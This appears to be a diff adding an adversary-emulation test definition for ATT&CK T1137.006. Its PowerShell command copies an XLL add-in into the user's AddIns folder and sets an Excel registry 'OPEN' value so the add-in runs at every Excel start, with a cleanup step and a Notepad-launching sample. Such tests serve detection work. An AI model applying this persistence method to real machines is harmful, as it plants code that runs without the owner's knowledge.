@@ -1,0 +1,30 @@
+- description: 'Creates an Excel Add-in file (XLL) and sets a registry key to make
+    it run automatically when Excel is started
+
+    The sample XLL provided launches the notepad as a proof-of-concept for persistent
+    execution from Office.
+
+    '
+  id: 18758e9e12d844a371ff3b454aaca4ae
+  name: Persistent Code Execution Via Excel Add-in File (XLL)
+  platforms:
+    windows:
+      psh:
+        cleanup: $ver = (New-Object -COMObject "Excel.Application").version; Remove-Item
+          "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore;
+          Stop-Process -Name "notepad","Excel" -ErrorAction Ignore; Start-Sleep 3;
+          Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
+        command: $excelApp = New-Object -COMObject "Excel.Application"; if(-not $excelApp.path.contains("Program
+          Files (x86)")){;     Write-Host "64-bit Office";     Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"
+          "$env:APPDATA\Microsoft\AddIns\notepad.xll"; }; else{;   Write-Host "32-bit
+          Office";   Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"
+          "$env:APPDATA\Microsoft\AddIns\notepad.xll"; }; $ver = $excelApp.version;
+          $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"; Remove-Item
+          $ExcelRegPath -ErrorAction Ignore; New-Item -type Directory $ExcelRegPath
+          | Out-Null; New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll"
+          -propertyType string | Out-Null; $excelApp.Quit(); Start-Process "Excel"
+        payloads: []
+  tactic: persistence
+  technique:
+    attack_id: T1137.006
+    name: 'Office Application Startup: Add-ins'
